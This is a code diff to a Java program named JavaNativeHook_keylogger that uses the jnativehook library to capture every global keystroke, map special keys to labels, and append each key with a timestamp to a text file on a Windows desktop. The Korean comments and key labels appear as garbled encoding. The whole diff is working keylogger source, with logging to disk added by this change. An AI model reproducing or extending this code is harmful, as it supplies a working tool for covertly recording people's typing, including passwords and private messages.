@@ -1,4 +1,11 @@
-
+// GUI Ãß°¡ ¹× ¹öÆÛÈ¿À² °³¼± ÇÊ¿ä (Still implementing...)
+//-------------------------------------------------
+// import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter; // for File Writer
+//-------------------------------------------------
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
@@ -10,7 +17,15 @@ import org.jnativehook.keyboard.NativeKeyListener;
 public class JavaNativeHook_keylogger implements NativeKeyListener {
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
-		String st = NativeKeyEvent.getKeyText(arg0.getKeyCode()).toLowerCase();
+		//+++++++++++++++++++++++++++Time & DateFormat ++++++++++++++++++++++++++++++
+		SimpleDateFormat format1 = new SimpleDateFormat ( "YYYY-MM-dd HH:mm:ss" );
+		
+		Date time = new Date();
+				
+		String time1 = "{"+format1.format(time)+"}"; //½Ã°£Ã³¸®
+		//+++++++++++++++++++++++++++++++++++++++++++++=====+++++++++++++++++++++++++
+		
+		String st = "["+NativeKeyEvent.getKeyText(arg0.getKeyCode()).toLowerCase()+"]";
 		switch(st) {
 		case "space":
 			st = st.replace("space", " ");
@@ -19,7 +34,7 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 			st = st.replace("ctrl","[CTRL]");
 			break;
 		case "meta":
-			st = st.replace("meta","[ìœˆë„ìš°í‚¤]");
+			st = st.replace("meta","[À©µµ¿ìÅ°]");
 			break;
 		case "alt":
 			st = st.replace("alt","[ALT]");
@@ -39,8 +54,8 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 		case "enter":
 			st = st.replace("enter","[ENTER]");
 			break;
-		case "ê°€íƒ€ì¹´ë‚˜":
-			st = st.replace("ê°€íƒ€ì¹´ë‚˜","[í•œ/ì˜]");
+		case "°¡Å¸Ä«³ª":
+			st = st.replace("°¡Å¸Ä«³ª","[ÇÑ/¿µ]");
 			break;
 		case "caps lock":
 			st = st.replace("caps lock","[CAPS LOCK]");
@@ -51,8 +66,8 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 		case "minus":
 			st = st.replace("minus","-");
 			break;
-		case "ê°„ì§€":
-			st = st.replace("ê°„ì§€","[í•œì]");
+		case "°£Áö":
+			st = st.replace("°£Áö","[ÇÑÀÚ]");
 			break;
 		case "period":
 			st = st.replace("period",".");
@@ -64,22 +79,43 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 			st = st.replace("quote","`");
 			break;
 		case "right":
-			st = st.replace("right","â†’");
+			st = st.replace("right","¡æ");
 			break;
 		case "left":
-			st = st.replace("left","â†");
+			st = st.replace("left","¡ç");
 			break;
 		case "up":
-			st = st.replace("up","â†‘");
+			st = st.replace("up","¡è");
 			break;
 		case "down":
-			st = st.replace("down","â†“");
+			st = st.replace("down","¡é");
 			break;
 		}
 
-    System.out.print(st);
+    System.out.print(st); //Console printing
+	//--------------------for File Writer-------------------------------
+    String fileName = "C:\\Users\\admin\\Desktop\\TEST\\test.txt";
+    try{
+        
+        // Create File
+        File file = new File(fileName) ;
+        // ´©Àû½Ä ÆÄÀÏ Ã³¸®
+        FileWriter fwriter = new FileWriter(file, true) ;
+        String space="\r\n";
+        // Write a string into file
+        
+        //fwriter.write(time1); //ÇöÀç ½Ã°£ Ãß°¡
+        fwriter.write(time1+st+space);
+       //fwriter.write(space);
+        fwriter.flush();
 
+        fwriter.close();
+
+    }catch(Exception e){
+        e.printStackTrace();
+    	}
 	}
+	//-----------------------¹öÆÛ È¿À² °³¼± ÇÊ¿ä-------------------------------
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent arg0) { }
 	@Override
